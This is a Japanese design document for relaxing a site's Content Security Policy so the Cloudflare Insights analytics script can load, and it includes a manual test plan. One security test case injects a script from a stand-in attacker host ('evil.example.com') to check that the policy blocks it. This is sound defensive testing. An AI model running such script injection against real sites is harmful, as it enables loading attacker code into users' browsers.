# 設計書

## 概要

Cloudflare Insightsスクリプトが現在のCSP設定によってブロックされている問題を解決します。セキュリティを維持しながら、Cloudflare Pagesの解析機能を有効化するため、`_headers`ファイルのCSP設定を最小限の変更で修正します。

## アーキテクチャ

### 現在の問題

```
ブラウザ
  ↓ ページ読み込み
Cloudflare Pages
  ↓ 自動挿入
Cloudflare Insights スクリプト (beacon.min.js)
  ↓ 読み込み試行
CSP: script-src 'self'
  ↓ ブロック
❌ エラー: CSP違反
```

### 修正後のフロー

```
ブラウザ
  ↓ ページ読み込み
Cloudflare Pages
  ↓ 自動挿入
Cloudflare Insights スクリプト (beacon.min.js)
  ↓ 読み込み試行
CSP: script-src 'self' https://static.cloudflareinsights.com
  ↓ 許可
✅ 正常動作
```

## コンポーネントと修正内容

### 1. _headersファイルの修正

**現在の設定:**
```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; ...
```

**修正後の設定:**
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline'; ...
```

**変更点:**
- `script-src 'self'` → `script-src 'self' https://static.cloudflareinsights.com`
- Cloudflare Insightsドメインのみを追加
- 他のディレクティブは変更なし

### 2. セキュリティ考慮事項

#### 追加するドメインの正当性

- **ドメイン**: `https://static.cloudflareinsights.com`
- **提供元**: Cloudflare（ホスティングプロバイダー）
- **用途**: アクセス解析（Web Analytics）
- **信頼性**: Cloudflare公式サービス、HTTPS通信

#### 最小権限の原則

- 必要最小限のドメインのみ追加
- ワイルドカード（`*.cloudflare.com`）は使用しない
- 特定のスクリプトパス（`/beacon.min.js`）ではなくドメイン全体を許可（Cloudflareの仕様変更に対応）

### 3. 代替案: Cloudflare Insightsの無効化

Cloudflare Insightsを使用しない場合、Cloudflare Pagesの設定で無効化できます。

**手順:**
1. Cloudflare Dashboardにログイン
2. Pages → 該当プロジェクト → Settings
3. "Web Analytics" セクションで無効化

**メリット:**
- CSP設定の変更不要
- 外部スクリプトの読み込みゼロ

**デメリット:**
- アクセス解析データが取得できない
- ユーザー行動の把握が困難

## データモデル

このタスクはHTTPヘッダー設定の変更のみで、データモデルの変更はありません。

## エラーハンドリング

### CSP違反の検出

**修正前:**
```javascript
// ブラウザコンソールに表示されるエラー
Refused to load the script 'https://static.cloudflareinsights.com/beacon.min.js/...' 
because it violates the following Content Security Policy directive: "script-src 'self'".
```

**修正後:**
```javascript
// エラーなし、正常に読み込まれる
```

### 検証方法

1. **ブラウザコンソールの確認**
   - CSP違反エラーが表示されないこと
   - Cloudflare Insightsスクリプトが正常に読み込まれること

2. **ネットワークタブの確認**
   - `beacon.min.js` のHTTPステータスが200であること
   - スクリプトが正常にダウンロードされること

3. **アプリケーション機能の確認**
   - 地図表示が正常に動作すること
   - バス停検索が正常に動作すること
   - 時刻表検索が正常に動作すること

## テスト戦略

### 1. 手動テスト

#### テストケース1: CSP違反エラーの解消
- **前提条件**: 修正前の_headersファイルがデプロイされている
- **手順**:
  1. ブラウザでアプリケーションを開く
  2. デベロッパーツールのコンソールを確認
- **期待結果**: CSP違反エラーが表示される

- **前提条件**: 修正後の_headersファイルがデプロイされている
- **手順**:
  1. ブラウザでアプリケーションを開く
  2. デベロッパーツールのコンソールを確認
- **期待結果**: CSP違反エラーが表示されない

#### テストケース2: 既存機能の動作確認
- **前提条件**: 修正後の_headersファイルがデプロイされている
- **手順**:
  1. 地図が正常に表示されることを確認
  2. バス停検索が正常に動作することを確認
  3. 時刻表検索が正常に動作することを確認
- **期待結果**: 全ての機能が正常に動作する

### 2. セキュリティテスト

#### テストケース3: 不正なスクリプトのブロック
- **前提条件**: 修正後の_headersファイルがデプロイされている
- **手順**:
  1. デベロッパーツールのコンソールで以下を実行:
     ```javascript
     const script = document.createElement('script');
     script.src = 'https://evil.example.com/malicious.js';
     document.body.appendChild(script);
     ```
  2. コンソールを確認
- **期待結果**: CSP違反エラーが表示され、スクリプトがブロックされる

### 3. ドキュメントテスト

#### テストケース4: コメントの正確性
- **手順**:
  1. _headersファイルのコメントを確認
  2. 実際のCSP設定と一致することを確認
- **期待結果**: コメントが正確で、保守性が高い

## 実装の優先順位

1. **高優先度**: _headersファイルのCSP設定修正
2. **中優先度**: 動作確認とテスト
3. **低優先度**: ドキュメント更新（必要に応じて）

## 設計上の決定事項

### 決定1: Cloudflare Insightsを許可する

**理由:**
- アクセス解析はアプリケーション改善に有用
- Cloudflareは信頼できるプロバイダー
- セキュリティリスクは最小限

**代替案:**
- Cloudflare Insightsを無効化する
- 別の解析ツール（Google Analytics等）を使用する

**選択理由:**
- 既にCloudflare Pagesを使用しているため、統合が容易
- 追加のスクリプト読み込みが不要
- プライバシーに配慮した解析が可能

### 決定2: ドメイン全体を許可する

**理由:**
- Cloudflareがスクリプトのパスやバージョンを変更する可能性がある
- 特定のパスのみ許可すると、将来的に動作しなくなる可能性がある

**代替案:**
- 特定のスクリプトパスのみ許可する（例: `/beacon.min.js`）

**選択理由:**
- 保守性が高い
- Cloudflareの仕様変更に対応しやすい
- セキュリティリスクは限定的（Cloudflare公式ドメインのみ）

## 参考資料

- [Content Security Policy (CSP) - MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Cloudflare Web Analytics](https://developers.cloudflare.com/analytics/web-analytics/)
- [Cloudflare Pages Headers](https://developers.cloudflare.com/pages/platform/headers/)
